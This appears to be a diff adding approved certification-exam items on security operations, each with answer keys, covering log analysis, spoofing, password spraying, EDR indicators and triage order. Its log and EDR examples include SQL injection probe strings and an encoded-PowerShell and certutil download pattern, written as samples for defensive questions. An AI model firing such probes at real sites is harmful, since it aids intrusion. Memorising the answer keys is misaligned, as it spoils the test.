+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An analyst exports a Windows event log from a suspect host as an EVTX file. Why can the file not be read in a plain text editor?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "It is encrypted with a key that only the host holds"
+        },
+        {
+          "id": "b",
+          "text": "It is a compressed archive of several JSON files"
+        },
+        {
+          "id": "c",
+          "text": "It is binary, so it needs an event-aware viewer"
+        },
+        {
+          "id": "d",
+          "text": "It is a read-only memory image from the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "EVTX is Microsoft's binary event log format, so it is opened with an event viewer or a parsing library that can render the records. It is not encrypted by default, not a JSON archive and not a memory image.",
+    "acronyms": [
+      "EVTX",
+      "JSON"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-032",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which PowerShell command reads events from the Security log on the local Windows host?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`Get-Content -Path Security -Tail 50`"
+        },
+        {
+          "id": "b",
+          "text": "`Get-WinEvent -LogName Security`"
+        },
+        {
+          "id": "c",
+          "text": "`Get-Service -Name EventLog`"
+        },
+        {
+          "id": "d",
+          "text": "`Get-Process -Name Security`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "`Get-WinEvent` queries event logs by name. `Get-Content` reads a file, `Get-Service` lists services and `Get-Process` lists running processes.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-033",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "An analyst pastes the headers of a reported message into MXToolbox. Which TWO findings suggest spoofing?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The SPF check returned fail"
+        },
+        {
+          "id": "b",
+          "text": "The Return-Path domain differs from the From domain"
+        },
+        {
+          "id": "c",
+          "text": "The message has an attachment"
+        },
+        {
+          "id": "d",
+          "text": "It was sent outside business hours"
+        },
+        {
+          "id": "e",
+          "text": "It contains a company logo"
+        },
+        {
+          "id": "f",
+          "text": "It was relayed through two servers"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "A failed SPF check and a mismatch between the envelope sender and the displayed sender are classic signs that the From address is forged. Attachments, send time, logos and normal relays also occur in genuine mail.",
+    "acronyms": [
+      "SPF"
+    ]
+  },
+  {
+    "id": "cs4-1-3-terminal-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-terminal",
+    "difficulty": 2,
+    "pbqWeight": 3,
+    "stem": "The web team on `web-03.example.internal` reports odd requests in the access log. Review the output, then complete each step.",
+    "payload": {
+      "output": [
+        "$ tail -n 5 access.log",
+        "203.0.113.50 - - [11/Nov 09:14:02] \"GET /login HTTP/1.1\" 200 1432",
+        "203.0.113.50 - - [11/Nov 09:14:09] \"GET /search?q=%27%20OR%201%3D1-- HTTP/1.1\" 500 311",
+        "198.51.100.8 - - [11/Nov 09:14:11] \"GET /index.html HTTP/1.1\" 200 5120",
+        "203.0.113.50 - - [11/Nov 09:14:15] \"GET /search?q=%27%20UNION%20SELECT%20null-- HTTP/1.1\" 500 311",
+        "203.0.113.50 - - [11/Nov 09:14:21] \"GET /admin/export.php HTTP/1.1\" 403 190"
+      ],
+      "steps": [
+        {
+          "id": "find",
+          "label": "Type a command that prints every line in access.log that contains 203.0.113.50"
+        },
+        {
+          "id": "read",
+          "label": "What do the encoded search requests most likely show?",
+          "options": [
+            {
+              "id": "xss",
+              "text": "Cross-site scripting attempts against the search page"
+            },
+            {
+              "id": "sqli",
+              "text": "SQL injection probing against the search page"
+            },
+            {
+              "id": "dir",
+              "text": "Directory guessing against the admin area"
+            },
+            {
+              "id": "normal",
+              "text": "Ordinary customers searching for products"
+            }
+          ]
+        },
+        {
+          "id": "act",
+          "label": "Choose the best next action",
+          "options": [
+            {
+              "id": "ignore",
+              "text": "Take no action, since the server answered with errors"
+            },
+            {
+              "id": "restart",
+              "text": "Restart the web server and close the ticket"
+            },
+            {
+              "id": "block",
+              "text": "Block 203.0.113.50 at the edge, then review its requests"
+            },
+            {
+              "id": "email",
+              "text": "Email the address owner and ask the visitor to stop"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "accept": {
+        "find": [
+          "grep 203.0.113.50 access.log",
+          "grep 203.0.113.50 ./access.log",
+          "grep \"203.0.113.50\" access.log",
+          "grep \"203.0.113.50\" ./access.log",
+          "grep '203.0.113.50' access.log",
+          "grep '203.0.113.50' ./access.log",
+          "grep 203\\.0\\.113\\.50 access.log",
+          "grep 203\\.0\\.113\\.50 ./access.log",
+          "grep \"203\\.0\\.113\\.50\" access.log",
+          "grep \"203\\.0\\.113\\.50\" ./access.log",
+          "grep '203\\.0\\.113\\.50' access.log",
+          "grep '203\\.0\\.113\\.50' ./access.log",
+          "grep -F 203.0.113.50 access.log",
+          "grep -F 203.0.113.50 ./access.log",
+          "grep -F \"203.0.113.50\" access.log",
+          "grep -F \"203.0.113.50\" ./access.log",
+          "grep -F '203.0.113.50' access.log",
+          "grep -F '203.0.113.50' ./access.log",
+          "grep -n 203.0.113.50 access.log",
+          "grep -n 203.0.113.50 ./access.log",
+          "grep -n \"203.0.113.50\" access.log",
+          "grep -n \"203.0.113.50\" ./access.log",
+          "grep -n '203.0.113.50' access.log",
+          "grep -n '203.0.113.50' ./access.log",
+          "grep -n 203\\.0\\.113\\.50 access.log",
+          "grep -n 203\\.0\\.113\\.50 ./access.log",
+          "grep -n \"203\\.0\\.113\\.50\" access.log",
+          "grep -n \"203\\.0\\.113\\.50\" ./access.log",
+          "grep -n '203\\.0\\.113\\.50' access.log",
+          "grep -n '203\\.0\\.113\\.50' ./access.log",
+          "grep -H 203.0.113.50 access.log",
+          "grep -H 203.0.113.50 ./access.log",
+          "grep -H \"203.0.113.50\" access.log",
+          "grep -H \"203.0.113.50\" ./access.log",
+          "grep -H '203.0.113.50' access.log",
+          "grep -H '203.0.113.50' ./access.log",
+          "grep -H 203\\.0\\.113\\.50 access.log",
+          "grep -H 203\\.0\\.113\\.50 ./access.log",
+          "grep -H \"203\\.0\\.113\\.50\" access.log",
+          "grep -H \"203\\.0\\.113\\.50\" ./access.log",
+          "grep -H '203\\.0\\.113\\.50' access.log",
+          "grep -H '203\\.0\\.113\\.50' ./access.log",
+          "grep -i 203.0.113.50 access.log",
+          "grep -i 203.0.113.50 ./access.log",
+          "grep -i \"203.0.113.50\" access.log",
+          "grep -i \"203.0.113.50\" ./access.log",
+          "grep -i '203.0.113.50' access.log",
+          "grep -i '203.0.113.50' ./access.log",
+          "grep -i 203\\.0\\.113\\.50 access.log",
+          "grep -i 203\\.0\\.113\\.50 ./access.log",
+          "grep -i \"203\\.0\\.113\\.50\" access.log",
+          "grep -i \"203\\.0\\.113\\.50\" ./access.log",
+          "grep -i '203\\.0\\.113\\.50' access.log",
+          "grep -i '203\\.0\\.113\\.50' ./access.log",
+          "grep -- 203.0.113.50 access.log",
+          "grep -- 203.0.113.50 ./access.log",
+          "grep -- \"203.0.113.50\" access.log",
+          "grep -- \"203.0.113.50\" ./access.log",
+          "grep -- '203.0.113.50' access.log",
+          "grep -- '203.0.113.50' ./access.log",
+          "grep -- 203\\.0\\.113\\.50 access.log",
+          "grep -- 203\\.0\\.113\\.50 ./access.log",
+          "grep -- \"203\\.0\\.113\\.50\" access.log",
+          "grep -- \"203\\.0\\.113\\.50\" ./access.log",
+          "grep -- '203\\.0\\.113\\.50' access.log",
+          "grep -- '203\\.0\\.113\\.50' ./access.log",
+          "grep -e 203.0.113.50 access.log",
+          "grep -e 203.0.113.50 ./access.log",
+          "grep -e \"203.0.113.50\" access.log",
+          "grep -e \"203.0.113.50\" ./access.log",
+          "grep -e '203.0.113.50' access.log",
+          "grep -e '203.0.113.50' ./access.log",
+          "grep -e 203\\.0\\.113\\.50 access.log",
+          "grep -e 203\\.0\\.113\\.50 ./access.log",
+          "grep -e \"203\\.0\\.113\\.50\" access.log",
+          "grep -e \"203\\.0\\.113\\.50\" ./access.log",
+          "grep -e '203\\.0\\.113\\.50' access.log",
+          "grep -e '203\\.0\\.113\\.50' ./access.log",
+          "egrep 203.0.113.50 access.log",
+          "egrep 203.0.113.50 ./access.log",
+          "egrep \"203.0.113.50\" access.log",
+          "egrep \"203.0.113.50\" ./access.log",
+          "egrep '203.0.113.50' access.log",
+          "egrep '203.0.113.50' ./access.log",
+          "egrep 203\\.0\\.113\\.50 access.log",
+          "egrep 203\\.0\\.113\\.50 ./access.log",
+          "egrep \"203\\.0\\.113\\.50\" access.log",
+          "egrep \"203\\.0\\.113\\.50\" ./access.log",
+          "egrep '203\\.0\\.113\\.50' access.log",
+          "egrep '203\\.0\\.113\\.50' ./access.log",
+          "fgrep 203.0.113.50 access.log",
+          "fgrep 203.0.113.50 ./access.log",
+          "fgrep \"203.0.113.50\" access.log",
+          "fgrep \"203.0.113.50\" ./access.log",
+          "fgrep '203.0.113.50' access.log",
+          "fgrep '203.0.113.50' ./access.log",
+          "grep -nF 203.0.113.50 access.log",
+          "grep -nF 203.0.113.50 ./access.log",
+          "grep -nF \"203.0.113.50\" access.log",
+          "grep -nF \"203.0.113.50\" ./access.log",
+          "grep -nF '203.0.113.50' access.log",
+          "grep -nF '203.0.113.50' ./access.log",
+          "grep -Fn 203.0.113.50 access.log",
+          "grep -Fn 203.0.113.50 ./access.log",
+          "grep -Fn \"203.0.113.50\" access.log",
+          "grep -Fn \"203.0.113.50\" ./access.log",
+          "grep -Fn '203.0.113.50' access.log",
+          "grep -Fn '203.0.113.50' ./access.log",
+          "cat access.log | grep 203.0.113.50",
+          "grep 203.0.113.50 < access.log",
+          "grep < access.log 203.0.113.50",
+          "cat access.log | grep \"203.0.113.50\"",
+          "grep \"203.0.113.50\" < access.log",
+          "grep < access.log \"203.0.113.50\"",
+          "cat access.log | grep '203.0.113.50'",
+          "grep '203.0.113.50' < access.log",
+          "grep < access.log '203.0.113.50'",
+          "cat access.log | grep 203\\.0\\.113\\.50",
+          "grep 203\\.0\\.113\\.50 < access.log",
+          "grep < access.log 203\\.0\\.113\\.50",
+          "cat access.log | grep \"203\\.0\\.113\\.50\"",
+          "grep \"203\\.0\\.113\\.50\" < access.log",
+          "grep < access.log \"203\\.0\\.113\\.50\"",
+          "cat access.log | grep '203\\.0\\.113\\.50'",
+          "grep '203\\.0\\.113\\.50' < access.log",
+          "grep < access.log '203\\.0\\.113\\.50'",
+          "cat access.log | grep -F 203.0.113.50",
+          "grep -F 203.0.113.50 < access.log",
+          "cat access.log | grep -F \"203.0.113.50\"",
+          "grep -F \"203.0.113.50\" < access.log",
+          "cat access.log | grep -F '203.0.113.50'",
+          "grep -F '203.0.113.50' < access.log",
+          "awk '/203.0.113.50/' access.log",
+          "awk '/203\\.0\\.113\\.50/' access.log",
+          "awk '/203.0.113.50/ {print}' access.log",
+          "awk '/203\\.0\\.113\\.50/ {print}' access.log",
+          "awk '/203.0.113.50/' ./access.log",
+          "awk '/203\\.0\\.113\\.50/' ./access.log",
+          "awk '/203.0.113.50/ {print}' ./access.log",
+          "awk '/203\\.0\\.113\\.50/ {print}' ./access.log",
+          "cat access.log | awk '/203.0.113.50/'"
+        ],
+        "read": [
+          "sqli"
+        ],
+        "act": [
+          "block"
+        ]
+      }
+    },
+    "explanation": "grep prints the lines that contain a pattern. The quote characters and `UNION SELECT` fragments in the query strings are database injection probes, and the repeated errors and the blocked admin export show a single source working through attacks, so it should be blocked and its other requests reviewed.",
+    "partExplanations": {
+      "find": "grep followed by the address and the file name prints only that source's requests.",
+      "read": "The encoded quote, OR 1=1 and UNION SELECT strings are classic SQL injection probes, not script tags or path guessing.",
+      "act": "Blocking the single noisy source and reviewing its other requests contains the activity; errors from the server do not make probing harmless."
+    },
+    "acronyms": [
+      "HTTP",
+      "SQL"
+    ]
+  },
+  {
+    "id": "cs4-1-3-data-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-data",
+    "difficulty": 2,
+    "pbqWeight": 4,
+    "stem": "A SIEM summarized sign-in activity for one ten-minute window. Use the table to answer each question.",
+    "payload": {
+      "caption": "Sign-ins by source address, 10:00 to 10:10",
+      "columns": [
+        "Source address",
+        "Failed",
+        "Succeeded",
+        "Accounts targeted"
+      ],
+      "rows": [
+        [
+          "203.0.113.50",
+          "300",
+          "0",
+          "150"
+        ],
+        [
+          "198.51.100.20",
+          "240",
+          "1",
+          "1"
+        ],
+        [
+          "192.0.2.77",
+          "12",
+          "88",
+          "25"
+        ],
+        [
+          "10.20.4.12",
+          "8",
+          "92",
+          "1"
+        ]
+      ],
+      "chart": {
+        "kind": "bar",
+        "labelColumn": 0,
+        "valueColumn": 1
+      },
+      "fields": [
+        {
+          "id": "total",
+          "label": "Total failed sign-ins across all four sources",
+          "options": [
+            {
+              "id": "540",
+              "text": "540"
+            },
+            {
+              "id": "552",
+              "text": "552"
+            },
+            {
+              "id": "560",
+              "text": "560"
+            }
+          ]
+        },
+        {
+          "id": "spray",
+          "label": "Which source fits password spraying (many accounts, about two tries each, no success)?",
+          "options": [
+            {
+              "id": "a",
+              "text": "203.0.113.50"
+            },
+            {
+              "id": "b",
+              "text": "198.51.100.20"
+            },
+            {
+              "id": "c",
+              "text": "192.0.2.77"
+            }
+          ]
+        },
+        {
+          "id": "rate",
+          "label": "Failure rate for 192.0.2.77 (failed divided by all attempts)",
+          "options": [
+            {
+              "id": "88",
+              "text": "88%"
+            },
+            {
+              "id": "12",
+              "text": "12%"
+            },
+            {
+              "id": "14",
+              "text": "14%"
+            }
+          ]
+        },
+        {
+          "id": "compromise",
+          "label": "Which source needs an account-compromise check first (many failures on one account, then a success)?",
+          "options": [
+            {
+              "id": "a",
+              "text": "203.0.113.50"
+            },
+            {
+              "id": "b",
+              "text": "198.51.100.20"
+            },
+            {
+              "id": "c",
+              "text": "10.20.4.12"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "total": "560",
+        "spray": "a",
+        "rate": "12",
+        "compromise": "b"
+      }
+    },
+    "explanation": "Failed attempts add to 560. A spray touches many accounts with few tries each and does not succeed, while one account hit 240 times and then opened points to a guessed password.",
+    "partExplanations": {
+      "total": "300 + 240 + 12 + 8 = 560; 552 leaves out the internal source and 540 is a miscount.",
+      "spray": "203.0.113.50 made 300 failures across 150 accounts, which is 2 per account, with no success.",
+      "rate": "12 failures out of 12 + 88 = 100 attempts is 12%; 14% divides by successes only and 88% is the success rate.",
+      "compromise": "198.51.100.20 failed 240 times against one account and then succeeded once, the pattern of a guessed password."
+    },
+    "acronyms": [
+      "SIEM"
+    ]
+  },
+  {
+    "id": "cs4-1-3-hotspot-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-hotspot",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "An EDR process list from `ws-0412.example.internal` shows six events. Select the THREE events that are likely indicators of malicious activity.",
+    "payload": {
+      "width": 480,
+      "height": 220,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "winword.exe started powershell.exe -enc"
+        },
+        {
+          "id": "n2",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "backup agent wrote a file to D:\\backups"
+        },
+        {
+          "id": "n3",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "svchost.exe ran from C:\\Users\\Public"
+        },
+        {
+          "id": "n4",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "chrome.exe opened the intranet wiki"
+        },
+        {
+          "id": "n5",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "certutil -urlcache -f to download a.exe"
+        },
+        {
+          "id": "n6",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "Patch agent contacted its vendor site"
+        }
+      ],
+      "spots": [
+        {
+          "id": "spawn",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "winword.exe started powershell.exe -enc"
+        },
+        {
+          "id": "backup",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "Backup agent file write"
+        },
+        {
+          "id": "svc",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "svchost.exe from a user folder"
+        },
+        {
+          "id": "chrome",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "chrome.exe intranet wiki"
+        },
+        {
+          "id": "certutil",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "certutil download"
+        },
+        {
+          "id": "patch",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "Patch agent vendor contact"
+        }
+      ]
+    },
+    "answer": {
+      "selected": [
+        "spawn",
+        "svc",
+        "certutil"
+      ]
+    },
+    "explanation": "An office program launching an encoded PowerShell command, a system process name running from a user-writable folder, and a built-in utility used to download an executable are common signs of compromise. A backup write, ordinary browsing and a vendor patch check fit normal operation.",
+    "partExplanations": {
+      "spawn": "A word processor starting an encoded script shell is a typical macro-based infection step.",
+      "backup": "A backup agent writing to its backup folder is expected activity.",
+      "svc": "The real service host runs from the system folder, so this copy in a public folder is masquerading.",
+      "chrome": "A browser opening an internal wiki is ordinary use.",
+      "certutil": "Using a certificate utility to fetch an executable is a living-off-the-land download.",
+      "patch": "An update agent calling its vendor is routine."
+    },
+    "acronyms": [
+      "EDR"
+    ]
+  },
+  {
+    "id": "cs4-1-3-match-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-match",
+    "difficulty": 1,
+    "pbqWeight": 5,
+    "stem": "Match each tool to the job it is best suited for.",
+    "payload": {
+      "prompts": [
+        {
+          "id": "p1",
+          "text": "CyberChef"
+        },
+        {
+          "id": "p2",
+          "text": "YARA"
+        },
+        {
+          "id": "p3",
+          "text": "Zeek"
+        },
+        {
+          "id": "p4",
+          "text": "MXToolbox"
+        },
+        {
+          "id": "p5",
+          "text": "OpenUBA"
+        }
+      ],
+      "choices": [
+        {
+          "id": "c1",
+          "text": "Detonates a sample in an isolated guest and reports its behavior"
+        },
+        {
+          "id": "c2",
+          "text": "Chains operations to decode or transform data"
+        },
+        {
+          "id": "c3",
+          "text": "Matches files against text and byte patterns"
+        },
+        {
+          "id": "c4",
+          "text": "Turns observed traffic into protocol logs"
+        },
+        {
+          "id": "c5",
+          "text": "Checks the DNS and SPF records and blocklist status of a mail domain"
+        },
+        {
+          "id": "c6",
+          "text": "Builds behavior baselines for users and entities"
+        }
+      ]
+    },
+    "answer": {
+      "pairs": {
+        "p1": "c2",
+        "p2": "c3",
+        "p3": "c4",
+        "p4": "c5",
+        "p5": "c6"
+      }
+    },
+    "explanation": "Each tool has a distinct role: transformation, pattern matching, network metadata, mail-domain checks and behavior analytics. Sandboxes, not listed here, are the tools that detonate samples.",
+    "partExplanations": {
+      "p1": "CyberChef strings together operations such as decoding to reveal hidden content.",
+      "p2": "YARA rules describe text and byte patterns that identify files or memory content.",
+      "p3": "Zeek records connections and protocol activity as structured logs.",
+      "p4": "MXToolbox looks up mail-related DNS records, authentication records and blocklists.",
+      "p5": "OpenUBA models normal behavior so deviations by users and entities stand out."
+    },
+    "acronyms": [
+      "YARA",
+      "DNS",
+      "SPF",
+      "OpenUBA"
+    ]
+  },
+  {
+    "id": "cs4-1-3-config-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-config",
+    "difficulty": 3,
+    "pbqWeight": 5,
+    "stem": "A SOC wants a SIEM rule that flags password spraying: many different accounts failing from one address within ten minutes. Configure the rule.",
+    "payload": {
+      "fields": [
+        {
+          "id": "source",
+          "label": "Log source to search",
+          "options": [
+            {
+              "id": "auth",
+              "text": "Identity provider authentication logs"
+            },
+            {
+              "id": "dhcp",
+              "text": "DHCP lease logs"
+            },
+            {
+              "id": "print",
+              "text": "Print queue logs"
+            }
+          ]
+        },
+        {
+          "id": "outcome",
+          "label": "Event outcome to match",
+          "options": [
+            {
+              "id": "ok",
+              "text": "Successful sign-in"
+            },
+            {
+              "id": "any",
+              "text": "Account password change"
+            },
+            {
+              "id": "fail",
+              "text": "Failed sign-in"
+            }
+          ]
+        },
+        {
+          "id": "group",
+          "label": "Group the results by",
+          "options": [
+            {
+              "id": "acct",
+              "text": "Target account"
+            },
+            {
+              "id": "src",
+              "text": "Source address"
+            },
+            {
+              "id": "time",
+              "text": "Event time"
+            }
+          ]
+        },
+        {
+          "id": "measure",
+          "label": "Value compared with the threshold",
+          "options": [
+            {
+              "id": "bytes",
+              "text": "Total bytes sent"
+            },
+            {
+              "id": "sess",
+              "text": "Average session length"
+            },
+            {
+              "id": "distinct",
+              "text": "Count of distinct target accounts"
+            }
+          ]
+        },
+        {
+          "id": "window",
+          "label": "Time window",
+          "options": [
+            {
+              "id": "24h",
+              "text": "24 hours"
+            },
+            {
+              "id": "10m",
+              "text": "10 minutes"
+            },
+            {
+              "id": "90d",
+              "text": "90 days"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "source": "auth",
+        "outcome": "fail",
+        "group": "src",
+        "measure": "distinct",
+        "window": "10m"
+      }
+    },
+    "explanation": "Spraying shows up as failed sign-ins in authentication logs, grouped by source, where the number of distinct accounts is high inside a short window.",
+    "partExplanations": {
+      "source": "Authentication logs are the only listed source that records sign-in attempts.",
+      "outcome": "The attacker's tries are failures, so the rule matches failed sign-ins.",
+      "group": "Grouping by source address ties the many accounts back to one origin.",
+      "measure": "Distinct target accounts separates spraying from many tries against one account.",
+      "window": "The scenario names a ten-minute span; a longer window would blur normal failures into the count."
+    },
+    "acronyms": [
+      "SIEM",
+      "SOC",
+      "DHCP"
+    ]
+  },
+  {
+    "id": "cs4-1-3-order-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "pbq-order",
+    "difficulty": 2,
+    "pbqWeight": 5,
+    "stem": "Put the triage steps for a suspicious attachment in the order an analyst should perform them. Rules: start with the check that needs the least access to the file, and never run the file until every step that only reads it is done.",
+    "payload": {
+      "steps": [
+        {
+          "id": "sDetonate",
+          "text": "Detonate the file in an isolated sandbox"
+        },
+        {
+          "id": "sHunt",
+          "text": "Hunt for other copies across hosts with the new rule"
+        },
+        {
+          "id": "sHash",
+          "text": "Look up the file hash in a reputation service"
+        },
+        {
+          "id": "sRule",
+          "text": "Write a detection rule from the behavior in the report"
+        },
+        {
+          "id": "sStrings",
+          "text": "Extract readable strings from the file"
+        }
+      ]
+    },
+    "answer": {
+      "order": [
+        "sHash",
+        "sStrings",
+        "sDetonate",
+        "sRule",
+        "sHunt"
+      ]
+    },
+    "explanation": "The workflow moves from a hash-only lookup, through static reading, to dynamic detonation, then turns what was learned into a rule and uses it to find other copies.",
+    "partExplanations": {
+      "0": "The hash lookup needs nothing but the hash, so it runs first.",
+      "1": "Strings read the file contents but do not run it.",
+      "2": "Detonation is dynamic and comes after static steps.",
+      "3": "The rule is written from behavior seen in the sandbox report.",
+      "4": "The rule is then used to hunt for other copies."
+    },
+    "acronyms": []
+  }
+]
